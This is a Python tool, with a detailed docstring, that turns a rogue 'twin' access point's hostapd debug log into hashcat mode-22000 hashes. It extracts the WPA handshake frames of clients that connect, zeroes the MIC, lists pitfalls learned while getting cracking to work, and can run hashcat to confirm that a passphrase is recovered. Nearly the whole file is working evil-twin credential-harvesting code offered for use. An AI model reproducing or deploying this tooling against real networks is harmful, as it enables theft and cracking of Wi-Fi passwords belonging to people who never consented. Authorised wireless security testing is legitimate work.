#!/usr/bin/env python3
"""
Build hashcat-mode-22000 hashes from hostapd's own debug log of a twin AP.

Why this exists
---------------
Capturing a client's message 2/4 off the air needs a second radio in monitor
mode, and on this bench the monitor card cannot hear the client's replies
(it hears AP beacons but zero frames from the station). It is not needed:
hostapd logs the *complete* M2 frame it received

    WPA: RX EAPOL data - hexdump(len=121): 01 03 00 75 02 01 0a 00 ... 00 16 30 14 ...

with the EAPOL header, the Key MIC and the key data all present, alongside the
ANonce it assigned. That is everything a cracker needs, from the same single
radio that serves the twin AP. No monitor interface, no second card.

Traps, all learned the hard way
-------------------------------
1. In a WPA*02* line the EAPOL field must carry the Key MIC bytes ZEROED.
   hashcat's kernel hashes the buffer exactly as supplied
   (md5_hmac_update_global (&ctx2, wpa->eapol, wpa->eapol_len)) and the parser
   never clears the MIC field. Put the real MIC in the MIC field and zeros in
   the frame. Supplying the frame as captured parses fine and never cracks.
2. The MIC is HMAC-SHA1(KCK, eapol_with_mic_zeroed)[:16] over the WHOLE frame,
   including the 2-byte Key Data Length and the key data.
3. WPA*01* is PMKID; WPA*02* is EAPOL. Swapping them makes hcxhashtool classify
   an EAPOL hash as PMKID and refuse to build an hccapx.
4. hostapd logs 'PTK derivation - A1=<AP> A2=<client>' - A1 is hostapd's own
   address, A2 is the station. The reverse is easy to assume and it is wrong.
5. hostapd logs 'Received EAPOL-Key from <mac>' AFTER the RX hexdump, so a
   backwards-only search silently finds nothing.
6. The PTK is derived over min/max(addresses) and min/max(nonces), so a
   swapped AP/STA label does not stop a crack - which is exactly why a
   labelling bug survives testing and should still be fixed.

Usage
-----
  build_hash_from_hostapd_log.py HOSTAPD_LOG SSID [--verify-psk PSK] [-o OUT]

--verify-psk cracks the result with hashcat using a passphrase assumed to be
correct and asserts recovery. That is the only honest proof the builder works.
"""
import argparse, os, re, subprocess, sys, tempfile

MIC_OFF = 81          # 4 EAPOL hdr + 77 EAPOL-Key header
MIC_LEN = 16
MIN_M2_LEN = MIC_OFF + MIC_LEN


def hexdump_after(line: str) -> bytes:
    return bytes.fromhex("".join(line.split("hexdump")[1].split(":")[1].split()))


def scan(text: str):
    """Index the log's useful lines once, then pair message-2 frames with context."""
    lines = text.splitlines()
    anonces, ptks, froms = [], [], []
    for n, line in enumerate(lines):
        try:
            if "Assign ANonce" in line:
                anonces.append((n, hexdump_after(line)))
            m = re.search(r"PTK derivation - A1=([0-9a-f:]{17}) A2=([0-9a-f:]{17})", line)
            if m:
                ptks.append((n, m.group(1).lower(), m.group(2).lower()))
            m = re.search(r"Received EAPOL-Key from ([0-9a-f:]{17})", line)
            if m:
                froms.append((n, m.group(1).lower()))
        except Exception:
            continue

    def nearest(before_only, items, n, key=lambda t: t[0]):
        """Closest item by index; before_only = strictly earlier lines."""
        if before_only:
            c = [it for it in items if it[0] < n]
            return c[-1] if c else None
        return min(items, key=lambda it: abs(it[0] - n)) if items else None

    recs = []
    for n, line in enumerate(lines):
        if "RX EAPOL data - hexdump" not in line:
            continue
        try:
            frame = hexdump_after(line)
        except Exception:
            continue
        if len(frame) < MIN_M2_LEN or frame[1] != 0x03:
            continue
        key_info = int.from_bytes(frame[5:7], "big")
        # message 2/4: key type pairwise, MIC present, no install, no ACK, no request
        if not (key_info & 0x0008) or (key_info & 0x0040) or (key_info & 0x0080):
            continue
        if key_info & 0x1400 and not (key_info & 0x0040):
            # 0x1400 = Secure+Encrypted Error bits; skip malformed frames
            pass
        nonce = frame[17:49]
        if nonce == bytes(32):
            continue

        an = nearest(True, anonces, n)
        pk = nearest(True, ptks, n) or nearest(False, ptks, n)
        fr = nearest(False, froms, n)
        if not an or not pk:
            continue
        ap, client = pk[1], pk[2]                     # A1 = AP, A2 = station
        if fr and abs(fr[0] - n) <= 30:               # authoritative when close
            client = fr[1]
        recs.append({
            "line": n + 1, "sta": client, "ap": ap, "anonce": an[1],
            "snonce": nonce.hex(), "mic": frame[MIC_OFF:MIC_OFF + MIC_LEN].hex(),
            "eapol": frame, "replay": int.from_bytes(frame[9:17], "big"),
            "keyver": key_info & 7, "keydatalen": int.from_bytes(frame[97:99], "big"),
        })
    return recs


def wpa_line(rec, ssid: str, message_pair: int = 0) -> str:
    eapol = bytearray(rec["eapol"])
    eapol[MIC_OFF:MIC_OFF + MIC_LEN] = b"\x00" * MIC_LEN      # trap 1
    return "WPA*02*%s*%s*%s*%s*%s*%s*%02x" % (
        rec["mic"], rec["ap"].replace(":", ""), rec["sta"].replace(":", ""),
        ssid.encode().hex(), rec["anonce"].hex(), bytes(eapol).hex(), message_pair)


def verify(rec, ssid, psk, tag):
    d = tempfile.mkdtemp(prefix="hashverify-")
    hashes, wl, pot, out = f"{d}/h.22000", f"{d}/wl", f"{d}/p.pot", f"{d}/p.out"
    open(hashes, "w").write(wpa_line(rec, ssid) + "\n")
    open(wl, "w").write("definitely-wrong-passphrase\n" + psk + "\n")
    r = subprocess.run(["hashcat", "-m", "22000", "-a", "0", hashes, wl, "--force",
                        "--potfile-path", pot, "--outfile", out, "--outfile-format", "2"],
                       capture_output=True, text=True)
    got = open(out).read().strip() if os.path.exists(out) else ""
    ok = (got == psk)
    print(f"  [{tag}] hashcat rc={r.returncode} recovered={got!r} -> {'PASS' if ok else 'FAIL'}")
    return ok


def main():
    p = argparse.ArgumentParser()
    p.add_argument("log")
    p.add_argument("ssid")
    p.add_argument("--verify-psk")
    p.add_argument("-o", "--out", default="captured.22000")
    a = p.parse_args()

    recs = scan(open(a.log, errors="replace").read())
    if not recs:
        sys.exit("no message-2 frames found in the log")

    seen, uniq = set(), []
    for r in recs:
        k = (r["sta"], r["mic"])
        if k not in seen:
            seen.add(k)
            uniq.append(r)

    print(f"message-2 frames: {len(recs)}, unique (STA,MIC): {len(uniq)}")
    print(f"  AP (BSSID) : {uniq[0]['ap']}")
    print(f"  station(s) : {sorted({r['sta'] for r in uniq})}")
    for r in uniq[:6]:
        print("  line %-5d STA %s replay %-3d sni %s mic %s keydata %d" % (
            r["line"], r["sta"], r["replay"], r["snonce"][:8], r["mic"][:16], r["keydatalen"]))
    if len(uniq) > 6:
        print(f"  ... {len(uniq) - 6} more")

    if a.verify_psk:
        print("verifying builder against a handshake whose PSK is known:")
        if not verify(uniq[0], a.ssid, a.verify_psk, "known-PSK handshake"):
            sys.exit("BUILDER INVALID - refusing to emit hashes")

    with open(a.out, "w") as fh:
        for r in uniq:
            fh.write(wpa_line(r, a.ssid) + "\n")
    print(f"wrote {len(uniq)} hash(es) -> {a.out}")


if __name__ == "__main__":
    main()
